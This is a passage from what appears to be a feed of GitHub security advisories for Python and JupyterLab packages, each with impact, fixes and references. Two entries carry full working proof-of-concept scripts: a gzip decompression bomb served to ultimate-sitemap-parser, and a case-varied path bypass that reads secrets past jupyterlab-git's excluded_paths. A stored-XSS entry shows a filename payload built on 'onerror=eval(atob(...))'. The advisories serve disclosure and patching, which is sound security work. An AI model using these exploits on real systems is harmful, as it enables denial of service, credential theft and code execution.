<p><strong>Environment setup:</strong></p>
<pre><code class="language-bash"># Clone the repository at the affected commit
git clone https://github.com/GateNLP/ultimate-sitemap-parser /tmp/usp-repo
cd /tmp/usp-repo
git checkout 182f4642f145230b68e7518e627883edd09168ca

# Build and run via Docker (memory-limited to 512 MiB)
docker build -t usp-vuln-002 -f vuln-002/Dockerfile /path/to/report-dir/
docker run --rm --memory=512m usp-vuln-002
</code></pre>
<p><strong>Alternatively, run directly:</strong></p>
<pre><code class="language-bash">python -m venv /tmp/usp-poc
. /tmp/usp-poc/bin/activate
pip install ultimate-sitemap-parser==1.8.0
python3 poc.py
</code></pre>
<p><strong>PoC script (<code>poc.py</code>) — abbreviated attack flow:</strong></p>
<pre><code class="language-python">import gzip, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from usp.tree import sitemap_tree_for_homepage

# Build a gzip bomb: 120 MB uncompressed, ~549 KB compressed
bomb_xml = (
    b'&lt;?xml version="1.0" encoding="UTF-8"?&gt;'
    b'&lt;urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt;'
    b'&lt;!--' + b'B' * (120 * 1024 * 1024) + b'--&gt;'
    b'&lt;/urlset&gt;'
)
compressed_bomb = gzip.compress(bomb_xml, compresslevel=1)

class BombHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        port = self.server.server_address[1]
        if self.path == "/robots.txt":
            body = f"Sitemap: http://127.0.0.1:{port}/sitemap.xml.gz\n".encode()
            self.send_response(200); self.end_headers(); self.wfile.write(body)
        elif self.path == "/sitemap.xml.gz":
            self.send_response(200)
            self.send_header("Content-Type", "application/x-gzip")
            self.end_headers(); self.wfile.write(compressed_bomb)
        else:
            self.send_response(404); self.end_headers()
    def log_message(self, *a): pass

server = HTTPServer(("127.0.0.1", 0), BombHandler)
port = server.server_address[1]
threading.Thread(target=server.serve_forever, daemon=True).start()

sitemap_tree_for_homepage(f"http://127.0.0.1:{port}/", use_known_paths=False)
server.shutdown()
</code></pre>
<p><strong>Expected output:</strong></p>
<pre><code>[INTERCEPT] gunzip() input=549,213 B  output=125,829,234 B (120.0 MB)
[+] sitemap_tree_for_homepage() returned without exception
compressed=549,213 B &lt; limit=104,857,600 B (passes gate)
decompressed=125,829,234 B &gt; limit=104,857,600 B (no post-decompress check)
EXCEEDS LIMIT: True
[PASS] Decompression bomb bypassed the size limit.
</code></pre>
<p>The parser fetches <code>/sitemap.xml.gz</code>, passes the compressed-size gate check, decompresses 549 KB into 120 MiB in process memory, and returns normally without raising an exception.</p>
<p><strong>Remediation:</strong></p>
<pre><code class="language-diff">--- a/usp/helpers.py
+++ b/usp/helpers.py
+import io
 
-def gunzip(data: bytes) -&gt; bytes:
+def gunzip(data: bytes, max_output_bytes: int | None = None) -&gt; bytes:
     try:
-        gunzipped_data = gzip_lib.decompress(data)
+        chunks, total = [], 0
+        with gzip_lib.GzipFile(fileobj=io.BytesIO(data)) as gz:
+            while chunk := gz.read(1024 * 1024):
+                total += len(chunk)
+                if max_output_bytes is not None and total &gt; max_output_bytes:
+                    raise GunzipException(
+                        f"Gunzipped data exceeds maximum size of {max_output_bytes} bytes."
+                    )
+                chunks.append(chunk)
+        gunzipped_data = b"".join(chunks)

-def ungzipped_response_content(url, response):
+def ungzipped_response_content(url, response, max_uncompressed_size=None):
-            data = gunzip(data)
+            data = gunzip(data, max_output_bytes=max_uncompressed_size)

--- a/usp/fetch_parse.py
-        response_content = ungzipped_response_content(url=self._url, response=response)
+        response_content = ungzipped_response_content(
+            url=self._url, response=response,
+            max_uncompressed_size=self.__MAX_SITEMAP_SIZE,
+        )
</code></pre>
<h3 id="impact">Impact</h3>
<p>Any application that calls <code>sitemap_tree_for_homepage()</code> (or the underlying fetch/parse pipeline) against an attacker-controlled or compromised domain is vulnerable. The attacker only needs to control a web server that serves a valid <code>robots.txt</code> pointing to a gzip-compressed sitemap URL. No authentication or special configuration is required; the vulnerability is triggered by default library behavior.</p>
<p>A ~549 KB compressed payload expands to 120 MiB in process memory. Larger bombs are possible up to the compressed-size limit (100 MiB of compressed data could expand to tens of gigabytes). Repeated requests or sufficiently large bombs can cause out-of-memory crashes, service disruptions, or denial of service in any process or service that performs sitemap crawling.</p>
<p>This vulnerability is a <strong>Denial of Service via Uncontrolled Resource Consumption (Decompression Bomb / Zip Bomb)</strong>. Affected parties include:</p>
<ul>
<li>SEO tooling, search engine crawlers, and indexing services using this library.</li>
<li>Web frameworks and microservices that expose a sitemap-crawling endpoint to external input.</li>
<li>Any automated pipeline that regularly crawls third-party sitemaps.</li>
</ul>
<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
<h4 id="dockerfile"><code>Dockerfile</code></h4>
<pre><code class="language-dockerfile">FROM python:3.12-slim

# Install build dependencies
RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \
    gcc \
    &amp;&amp; rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy the vulnerable library from the cloned repo (build context: parent dir)
COPY repo/ /app/repo/

# Install the library from local source (version 1.8.0)
RUN pip install --no-cache-dir /app/repo/

# Copy the PoC script
COPY vuln-002/poc.py /app/poc.py

# Run with unbuffered output so evidence appears immediately
CMD ["python3", "-u", "/app/poc.py"]
</code></pre>
<h4 id="pocpy"><code>poc.py</code></h4>
<pre><code class="language-python">#!/usr/bin/env python3
"""
Proof-of-Concept for VULN-002:
Gzip Decompression Bomb Bypasses Sitemap Size Limit
GateNLP/ultimate-sitemap-parser 1.8.0

Vulnerability location: usp/helpers.py:239
  gunzipped_data = gzip_lib.decompress(data)   # no max_length

Attack path:
  1. Attacker serves /robots.txt pointing to /sitemap.xml.gz
  2. Library enforces MAX_SITEMAP_SIZE (100 MB) on *compressed* response bytes
  3. Library calls gunzip() with no output-size limit
  4. Small compressed payload expands to &gt;&gt;100 MB in process memory

Expected outcome: gunzip() output size &gt; 100 MB with no exception raised.
"""

import gzip
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

# Mirrors usp/fetch_parse.py:64 — the library's declared maximum
MAX_SITEMAP_SIZE = 100 * 1024 * 1024  # 100 MB

# Bomb decompresses to this size (deliberately exceeds the limit)
BOMB_UNCOMPRESSED_MB = 120
BOMB_UNCOMPRESSED_BYTES = BOMB_UNCOMPRESSED_MB * 1024 * 1024


def get_rss_mb() -&gt; float:
    """Read current RSS from /proc/self/status in MB."""
    try:
        with open("/proc/self/status") as fh:
            for line in fh:
                if line.startswith("VmRSS:"):
                    return int(line.split()[1]) / 1024
    except OSError:
        pass
    return 0.0


# ---------------------------------------------------------------------------
# Step 1 — Build the gzip bomb
# ---------------------------------------------------------------------------
print("[*] Building gzip bomb (compresslevel=1, fast) ...")
bomb_xml = (
    b'&lt;?xml version="1.0" encoding="UTF-8"?&gt;'
    b'&lt;urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt;'
    b'&lt;!--' + b'B' * BOMB_UNCOMPRESSED_BYTES + b'--&gt;'
    b'&lt;/urlset&gt;'
)
compressed_bomb = gzip.compress(bomb_xml, compresslevel=1)

print(f"[+] Uncompressed payload : {len(bomb_xml):&gt;12,} bytes  ({len(bomb_xml)/1024/1024:.1f} MB)")
print(f"[+] Compressed bomb      : {len(compressed_bomb):&gt;12,} bytes  ({len(compressed_bomb)/1024/1024:.3f} MB)")
print(f"[+] Library MAX_SITEMAP_SIZE : {MAX_SITEMAP_SIZE:,} bytes (100.0 MB)")
print(f"[+] compressed &lt; limit   : {len(compressed_bomb) &lt; MAX_SITEMAP_SIZE}  "
      f"(bomb passes the size gate)")
print(f"[+] uncompressed &gt; limit : {len(bomb_xml) &gt; MAX_SITEMAP_SIZE}  "
      f"(decompression would exceed intent)")
print()

# ---------------------------------------------------------------------------
# Step 2 — Serve the bomb via a local HTTP server
# ---------------------------------------------------------------------------
class BombHandler(BaseHTTPRequestHandler):
    def do_GET(self) -&gt; None:
        port = self.server.server_address[1]
        if self.path == "/robots.txt":
            body = (
                f"User-agent: *\n"
                f"Sitemap: http://127.0.0.1:{port}/sitemap.xml.gz\n"
            ).encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        elif self.path == "/sitemap.xml.gz":
            self.send_response(200)
            self.send_header("Content-Type", "application/x-gzip")
            self.send_header("Content-Length", str(len(compressed_bomb)))
            self.end_headers()
            self.wfile.write(compressed_bomb)

        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, fmt: str, *args: object) -&gt; None:  # silence default log
        print(f"    [HTTP] {self.path}  {fmt % args}")


server = HTTPServer(("127.0.0.1", 0), BombHandler)
port = server.server_address[1]
threading.Thread(target=server.serve_forever, daemon=True).start()
print(f"[*] Bomb server listening on http://127.0.0.1:{port}/")

# ---------------------------------------------------------------------------
# Step 3 — Monkeypatch usp.helpers.gunzip to intercept decompressed size
# ---------------------------------------------------------------------------
import usp.helpers as _helpers

_orig_gunzip = _helpers.gunzip
_intercepted: list[int] = []


def _patched_gunzip(data: bytes) -&gt; bytes:
    result = _orig_gunzip(data)
    _intercepted.append(len(result))
    print(f"    [INTERCEPT] gunzip() input={len(data):,} B  output={len(result):,} B "
          f"({len(result)/1024/1024:.1f} MB)")
    return result


_helpers.gunzip = _patched_gunzip

# ---------------------------------------------------------------------------
# Step 4 — Trigger the vulnerability
# ---------------------------------------------------------------------------
from usp.tree import sitemap_tree_for_homepage

rss_before = get_rss_mb()
print(f"[*] RSS before parse: {rss_before:.1f} MB")
print(f"[*] Calling sitemap_tree_for_homepage(http://127.0.0.1:{port}/) ...")

try:
    _tree = sitemap_tree_for_homepage(
        f"http://127.0.0.1:{port}/",
        use_known_paths=False,
    )
    parse_raised = False
    print("[+] sitemap_tree_for_homepage() returned without exception")
except Exception as exc:
    parse_raised = True
    print(f"[!] sitemap_tree_for_homepage() raised: {exc}")

rss_after = get_rss_mb()
print(f"[*] RSS after  parse: {rss_after:.1f} MB  (delta: +{rss_after - rss_before:.1f} MB)")

server.shutdown()

# ---------------------------------------------------------------------------
# Step 5 — Evaluate and report
# ---------------------------------------------------------------------------
print()
print("=" * 60)
print("EXPLOIT RESULT SUMMARY")
print("=" * 60)

passed = False
reason = "no gunzip intercept captured"

if _intercepted:
    max_decompressed = max(_intercepted)
    print(f"  gunzip() call(s)     : {len(_intercepted)}")
    print(f"  max decompressed     : {max_decompressed:,} bytes ({max_decompressed/1024/1024:.1f} MB)")
    print(f"  library limit        : {MAX_SITEMAP_SIZE:,} bytes (100.0 MB)")
    print(f"  EXCEEDS LIMIT        : {max_decompressed &gt; MAX_SITEMAP_SIZE}")

    if max_decompressed &gt; MAX_SITEMAP_SIZE:
        passed = True
        reason = (
            f"gunzip() decompressed {max_decompressed:,} bytes "
            f"({max_decompressed/1024/1024:.1f} MB), exceeding the "
            f"{MAX_SITEMAP_SIZE/1024/1024:.0f} MB limit without raising an exception"
        )
        print()
        print("  [PASS] Decompression bomb bypassed the size limit.")
        print(f"  compressed={len(compressed_bomb):,} B &lt; limit={MAX_SITEMAP_SIZE:,} B "
              f"(passes gate)")
        print(f"  decompressed={max_decompressed:,} B &gt; limit={MAX_SITEMAP_SIZE:,} B "
              f"(no post-decompress check)")
    else:
        reason = (
            f"gunzip() decompressed {max_decompressed:,} bytes but did not exceed "
            f"{MAX_SITEMAP_SIZE:,} bytes limit"
        )
        print()
        print("  [FAIL] Decompressed size did not exceed limit.")
else:
    print("  [FAIL] gunzip() was not intercepted — sitemap path not reached.")

print("=" * 60)
sys.exit(0 if passed else 1)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GateNLP/ultimate-sitemap-parser/security/advisories/GHSA-8823-qg2x-pv9f">https://github.com/GateNLP/ultimate-sitemap-parser/security/advisories/GHSA-8823-qg2x-pv9f</a></li>
<li><a href="https://github.com/advisories/GHSA-8823-qg2x-pv9f">https://github.com/advisories/GHSA-8823-qg2x-pv9f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8823-qg2x-pv9f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T21:15:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[galaxy-ng] Galaxy NG: command injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6hw7-j4jw-wpff</id>
        <link href="https://github.com/advisories/GHSA-6hw7-j4jw-wpff"/>
        <updated>2026-06-19T20:48:07.000Z</updated>
        <content type="html"><![CDATA[<p>A command injection vulnerability was found in galaxy_ng. The do_git_checkout() function in the legacy role import API (v1) interpolates unsanitized git ref names (branch/tag names) into shell commands executed via subprocess.run() with shell=True. An authenticated user who controls a git repository can create a branch or tag with shell metacharacters in the name to achieve remote code execution on the pulp worker. The vulnerable endpoint is only reachable when GALAXY_ENABLE_LEGACY_ROLES is set to True, which is not the default configuration.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12398">https://nvd.nist.gov/vuln/detail/CVE-2026-12398</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-12398">https://access.redhat.com/security/cve/CVE-2026-12398</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2489180">https://bugzilla.redhat.com/show_bug.cgi?id=2489180</a></li>
<li><a href="https://github.com/advisories/GHSA-6hw7-j4jw-wpff">https://github.com/advisories/GHSA-6hw7-j4jw-wpff</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6hw7-j4jw-wpff</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-16T15:33:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ujson] UltraJSON: Malformed/Truncated UTF-8 Accepted and Silently Rewritten in ujson.dumps()]]></title>
        <id>https://github.com/advisories/GHSA-3j69-69wj-xqx2</id>
        <link href="https://github.com/advisories/GHSA-3j69-69wj-xqx2"/>
        <updated>2026-06-19T20:47:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>ujson.dumps()</code> (or <code>ujson.dump()</code> or <code>ujson.encode()</code>) have a <code>reject_bytes=False</code> option. When set, they may accept malformed or truncated UTF-8 byte sequences, silently rewriting them into different Unicode characters instead of rejecting them. This leads to input validation bypass and data integrity issues.</p>
<h3 id="details">Details</h3>
<p>The expected behavior is that for <code>x</code> being any bytes string, <code>x == ujson.loads(ujson.dumps(x, reject_bytes=False)).encode(errors="surrogatepass")</code> should always either be true or <code>ujson.dumps()</code> will throw an exception. In reality, some strings which should've been errors are silently rewritten as other strings:</p>
<ul>
<li>Invalid continuation bytes are replaced with valid ones: <code>b'\xcf\x13'</code> -&gt; <code>b'\xcf\x93'</code></li>
<li>Unterminated sequence completes the sequence: <code>b'\xc3'</code> -&gt; <code>b'\xc3\x80'</code></li>
<li>... or leads to reading past the end of string: <code>b'\xf0\x90\x94'</code> -&gt; <code>b"\xf0\x90\x94\x80inxcontrib'"</code></li>
</ul>
<h3 id="impact">Impact</h3>
<p>An application relying on reject_bytes=False for UTF-8 handling may experience:</p>
<ul>
<li>Data integrity issues</li>
<li>Experience validation bypass if said validation occurs before serialisation</li>
</ul>
<h3 id="remediation">Remediation</h3>
<p>The missing/broken UTF-8 validation checks were added/fixed in <a href="https://github.com/ultrajson/ultrajson/commit/169eaf36b1116fece5034ee79a7a0ef3f6deedcf">https://github.com/ultrajson/ultrajson/commit/169eaf36b1116fece5034ee79a7a0ef3f6deedcf</a>. We recommend upgrading to <a href="https://github.com/ultrajson/ultrajson/releases/tag/5.13.0">UltraJSON 5.13.0</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Decoding bytes to strings in Python before passing them to <code>ujson.dumps()</code> avoids this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ultrajson/ultrajson/security/advisories/GHSA-3j69-69wj-xqx2">https://github.com/ultrajson/ultrajson/security/advisories/GHSA-3j69-69wj-xqx2</a></li>
<li><a href="https://github.com/ultrajson/ultrajson/commit/169eaf36b1116fece5034ee79a7a0ef3f6deedcf">https://github.com/ultrajson/ultrajson/commit/169eaf36b1116fece5034ee79a7a0ef3f6deedcf</a></li>
<li><a href="https://github.com/ultrajson/ultrajson/releases/tag/5.13.0">https://github.com/ultrajson/ultrajson/releases/tag/5.13.0</a></li>
<li><a href="https://github.com/advisories/GHSA-3j69-69wj-xqx2">https://github.com/advisories/GHSA-3j69-69wj-xqx2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3j69-69wj-xqx2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T20:47:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[python-liquid] Python Liquid: Infinite loop when parsing malformed `{% case %}` tags]]></title>
        <id>https://github.com/advisories/GHSA-vq2f-vcc9-j8mv</id>
        <link href="https://github.com/advisories/GHSA-vq2f-vcc9-j8mv"/>
        <updated>2026-06-19T20:46:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Given a malformed <code>{% case %}</code> tag without associated <code>{% when %}</code> or <code>{% else %}</code> block, and no terminating <code>{% endcase %}</code> tag, Python Liquid hangs in an infinite loop at parse time. This allows malicious template authors to craft templates for a denial of service attack.</p>
<h3 id="patches">Patches</h3>
<p>The issue is fixed in version 2.2.1 with the correction of the <code>liquid.TokenStream.eof</code> attribute. The <code>kind</code> and <code>value</code> of the special EOF token are now the same, so either can be tested against <code>liquid.token.TOKEN_EOF</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Manually correct the definition of <code>liquid.TokenStream.eof</code> before parsing any templates.</p>
<pre><code class="language-python">import liquid
from liquid.token import TOKEN_EOF

liquid.stream.TokenStream.eof = liquid.Token(TOKEN_EOF, TOKEN_EOF, -1, "")

# ...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jg-rp/liquid/security/advisories/GHSA-vq2f-vcc9-j8mv">https://github.com/jg-rp/liquid/security/advisories/GHSA-vq2f-vcc9-j8mv</a></li>
<li><a href="https://github.com/advisories/GHSA-vq2f-vcc9-j8mv">https://github.com/advisories/GHSA-vq2f-vcc9-j8mv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vq2f-vcc9-j8mv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T20:46:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyterlab-git] jupyterlab-git excluded_paths Case-Sensitivity Bypass Allows Reading Excluded Directories]]></title>
        <id>https://github.com/advisories/GHSA-436q-jwfr-rm2h</id>
        <link href="https://github.com/advisories/GHSA-436q-jwfr-rm2h"/>
        <updated>2026-06-19T19:36:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>jupyterlab-git</code> 0.53.0 (latest, 2026-04-30) uses <code>fnmatch.fnmatchcase()</code> in <code>GitHandler.prepare()</code> (<code>jupyterlab_git/handlers.py:91</code>) to enforce the admin-configured <code>excluded_paths</code> security control. Because <code>fnmatchcase</code> is unconditionally case-sensitive, an authenticated user on a case-insensitive filesystem (macOS APFS, Windows NTFS) can bypass the exclusion by varying the case of the URL path segment — e.g. requesting <code>/git/project/Secrets/...</code> instead of <code>/git/project/secrets/...</code> — gaining read access to git history, file content, and status in directories the administrator explicitly excluded.</p>
<h2 id="vulnerable-code">Vulnerable Code</h2>
<pre><code class="language-python"># jupyterlab_git/handlers.py:84-92
async def prepare(self):
    """Check if the path should be skipped"""
    await ensure_async(super().prepare())
    path = self.path_kwargs.get("path")
    if path is not None:
        excluded_paths = self.git.excluded_paths
        for excluded_path in excluded_paths:
            if fnmatch.fnmatchcase(path, excluded_path):  # ← always case-sensitive
                raise tornado.web.HTTPError(404)
</code></pre>
<h2 id="root-cause">Root Cause</h2>
<p><code>fnmatch.fnmatchcase()</code> is unconditionally case-sensitive regardless of the operating system. Contrast with <code>fnmatch.fnmatch()</code> which normalizes via <code>os.path.normcase()</code> on case-insensitive platforms.</p>
<pre><code class="language-python">fnmatch.fnmatchcase("/project/secrets", "/project/secrets")  # True  — blocked
fnmatch.fnmatchcase("/project/Secrets", "/project/secrets")  # False — bypasses check
</code></pre>
<p>On macOS APFS and Windows NTFS, <code>/project/Secrets</code> and <code>/project/secrets</code> resolve to the same directory on disk. The exclusion check rejects only the exact-case match, but the downstream <code>url2localpath()</code> resolves the case-varied path to the same filesystem location.</p>
<h2 id="impact">Impact</h2>
<p>An authenticated JupyterLab user with access to the affected Jupyter server can bypass admin-configured <code>excluded_paths</code> by varying the case of the URL path segment. This grants:</p>
<ul>
<li>Read file content at any git ref (<code>/content</code> endpoint)</li>
<li>Read working tree files in the excluded directory</li>
<li>View git status, log, diff on the excluded path</li>
<li>Enumerate commits touching excluded files</li>
</ul>
<h2 id="attack-scenario">Attack Scenario</h2>
<ol>
<li>Admin configures <code>c.JupyterLabGit.excluded_paths = ["/project/secrets", "/project/secrets/*"]</code></li>
<li>Normal request <code>POST /git/project/secrets/status</code> → HTTP 404 (blocked)</li>
<li>Attacker requests <code>POST /git/project/Secrets/status</code> → HTTP 200 (bypass)</li>
<li>Attacker reads secret: <code>POST /git/project/Secrets/content</code> with <code>{"filename": "./cred.txt", "reference": {"git": "HEAD"}}</code> → file content returned</li>
</ol>
<h2 id="exploit">Exploit</h2>
<p>See <code>poc.py</code>. Starts a real jupyter-server with jupyterlab-git loaded, configures <code>excluded_paths</code>, and demonstrates bypass + exfiltration via HTTP.</p>
<pre><code class="language-python">import json, os, shutil, subprocess, sys, tempfile, time
import urllib.request, urllib.error

from jupyterlab_git.handlers import GitHandler  # real import, no mock
from jupyterlab_git_core.git import Git
import jupyterlab_git_core

PORT = 18895
TOKEN = "xtoken"
BASE_URL = f"http://127.0.0.1:{PORT}"
SECRET = "sk-PROD-a8f2x9q-LIVE-KEY"


def post(path_seg, endpoint, body=None):
    url = f"{BASE_URL}/git/{path_seg}{endpoint}"
    data = json.dumps(body or {}).encode()
    req = urllib.request.Request(url, data=data, method="POST",
        headers={"Authorization": f"token {TOKEN}", "Content-Type": "application/json"})
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def main():
    base_dir = tempfile.mkdtemp(prefix="jlgit_")
    workspace = os.path.join(base_dir, "workspace")
    repo_dir = os.path.join(workspace, "project")
    secret_dir = os.path.join(repo_dir, "secrets")
    os.makedirs(secret_dir)

    with open(os.path.join(secret_dir, "cred.txt"), "w") as f:
        f.write(SECRET + "\n")

    git_env = {**os.environ, "GIT_AUTHOR_NAME": "a", "GIT_AUTHOR_EMAIL": "a@x",
               "GIT_COMMITTER_NAME": "a", "GIT_COMMITTER_EMAIL": "a@x"}
    subprocess.run(["git", "init"], cwd=repo_dir, capture_output=True, check=True)
    subprocess.run(["git", "add", "."], cwd=repo_dir, capture_output=True, check=True)
    subprocess.run(["git", "commit", "-m", "init"], cwd=repo_dir,
                   capture_output=True, check=True, env=git_env)

    config_path = os.path.join(base_dir, "jupyter_server_config.py")
    with open(config_path, "w") as f:
        f.write(f'c.ServerApp.root_dir = "{workspace}"\n')
        f.write(f'c.ServerApp.token = "{TOKEN}"\n')
        f.write(f'c.ServerApp.open_browser = False\n')
        f.write(f'c.ServerApp.port = {PORT}\n')
        f.write(f'c.ServerApp.ip = "127.0.0.1"\n')
        f.write(f'c.ServerApp.disable_check_xsrf = True\n')
        f.write(f'c.JupyterLabGit.excluded_paths = ["/project/secrets", "/project/secrets/*"]\n')

    env = os.environ.copy()
    env["JUPYTER_CONFIG_DIR"] = base_dir
    env["JUPYTER_DATA_DIR"] = base_dir
    proc = subprocess.Popen(
        [sys.executable, "-m", "jupyter_server", f"--config={config_path}",
         "--ServerApp.jpserver_extensions={'jupyterlab_git': True}"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env, cwd=base_dir)

    for _ in range(30):
        try:
            req = urllib.request.Request(f"{BASE_URL}/api/status",
                                         headers={"Authorization": f"token {TOKEN}"})
            if urllib.request.urlopen(req, timeout=2).status == 200:
                break
        except (urllib.error.URLError, OSError):
            pass
        time.sleep(0.5)
    else:
        proc.kill()
        shutil.rmtree(base_dir, ignore_errors=True)
        sys.exit("server failed to start")

    try:
        # exclusion works
        code, _ = post("project/secrets", "/status")
        blocked = code == 404

        # bypass
        code, _ = post("project/Secrets", "/status")
        bypassed = code == 200

        # exfiltrate
        code, body = post("project/Secrets", "/content",
                          {"filename": "./cred.txt", "reference": {"git": "HEAD"}})
        content = body.get("content", "") if isinstance(body, dict) else ""
        exfiltrated = SECRET in content

        ok = blocked and bypassed and exfiltrated
        print(f"exclusion enforced (lowercase): {blocked}")
        print(f"bypass (case-varied):           {bypassed}")
        print(f"secret exfiltrated:             {exfiltrated}")
        print(f"result:                         {'VULNERABLE' if ok else 'NOT CONFIRMED'}")
        return ok

    finally:
        proc.terminate()
        proc.wait(timeout=5)
        shutil.rmtree(base_dir, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(0 if main() else 1)
</code></pre>
<pre><code class="language-bash">pip install 'jupyterlab-git==0.53.0'
python poc.py
</code></pre>
<img width="686" height="146" alt="image" src="https://github.com/user-attachments/assets/f5b8d349-539a-44d7-9b17-d13b5f802625">


<h2 id="fix">Fix</h2>
<pre><code class="language-python">if fnmatch.fnmatch(path.lower(), excluded_path.lower()):
    raise tornado.web.HTTPError(404)
</code></pre>
<p>Or apply <code>os.path.normcase()</code> to both operands before comparison.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-436q-jwfr-rm2h">https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-436q-jwfr-rm2h</a></li>
<li><a href="https://github.com/advisories/GHSA-436q-jwfr-rm2h">https://github.com/advisories/GHSA-436q-jwfr-rm2h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-436q-jwfr-rm2h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T19:36:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyterlab-git-core] jupyterlab-git extension: Stored XSS leading to RCE]]></title>
        <id>https://github.com/advisories/GHSA-f962-v9hr-pfg5</id>
        <link href="https://github.com/advisories/GHSA-f962-v9hr-pfg5"/>
        <updated>2026-06-19T19:36:06.000Z</updated>
        <content type="html"><![CDATA[<p>Overview</p>
<p>Amazon Web Services (AWS) Security has identified a stored cross-site scripting (XSS) issue in the jupyterlab-git JupyterLab extension that can lead to remote code execution (RCE). The issue exists in the&nbsp;PlainTextDiff.ts component, where the createHeader() method passes Git filenames directly to innerHTML without sanitization when rendering diffs for renamed files in commit history. This allows an adversary to&nbsp;craft a filename containing arbitrary HTML/JavaScript that executes when another user views the rename diff in the Git History tab.</p>
<p>The issue can be leveraged through the rename history view in the JupyterLab Git panel. An adversary creates a file with a crafted filename containing a JavaScript payload (e.g.,&nbsp;&lt;img src=x onerror=eval(atob("base64_payload"))&gt;.py), renames the file in a subsequent commit, and pushes to a shared repository. When a victim clones the repository, navigates to the Git History tab, clicks the&nbsp;rename commit, and then clicks the renamed file to view the diff, the unsanitized filename renders via innerHTML, executing arbitrary JavaScript in the victim's browser session. The injected JavaScript reads the&nbsp;xsrf cookie, opens a JupyterLab terminal via POST /api/terminals, connects via WebSocket, and executes arbitrary shell commands — achieving full RCE. An adversary can leverage this to exfiltrate secrets or&nbsp;credentials from the victim's environment.</p>
<p>Scope of impact</p>
<p>We discovered this issue during internal security testing. The issue is present in the default configuration of JupyterLab when the jupyterlab-git extension is installed.</p>
<p>The attack requires:</p>
<ul>
<li><p>The adversary to have commit access to a Git repository that the victim has cloned</p>
</li>
<li><p>The victim to navigate to the Git History tab, click the rename commit, and&nbsp;click the renamed file to view the diff</p>
</li>
</ul>
<p>The issue could allow an actor who has access to a shared Git repository to execute arbitrary JavaScript in another user's JupyterLab environment by committing a file with a crafted filename, potentially leading to remote code execution with access to user code, data, environment variables, and credentials.</p>
<p>Proof of concept</p>
<p>The issue exists in the createHeader() method where filenames from rename history are passed directly to innerHTML without sanitization:</p>
<p>[1] <a href="https://github.com/jupyterlab/jupyterlab-git/blob/main/src/components/diff/PlainTextDiff.ts#L214">https://github.com/jupyterlab/jupyterlab-git/blob/main/src/components/diff/PlainTextDiff.ts#L214</a></p>
<p>Attack flow:</p>
<ol>
<li><p>An adversary creates a file with a crafted filename containing a JavaScript payload, e.g., &lt;img src=x onerror=eval(atob("base64_payload"))&gt;.py</p>
</li>
<li><p>The adversary renames the file in a subsequent commit and pushes both commits to a shared Git repository</p>
</li>
<li><p>The victim clones or pulls the repository and navigates to the Git History tab in JupyterLab</p>
</li>
<li><p>The victim clicks the rename commit, then clicks the renamed file to view the diff</p>
</li>
<li><p>The createHeader() method constructs a diff header using string concatenation with the unsanitized filename and assigns the result to innerHTML</p>
</li>
<li><p>The injected JavaScript executes in the victim's browser session, reads the _xsrf cookie, sends a POST request to /api/terminals to open a JupyterLab terminal, connects via WebSocket, and executes arbitrary&nbsp;shell commands</p>
</li>
</ol>
<p>Proof-of-concept mitigation</p>
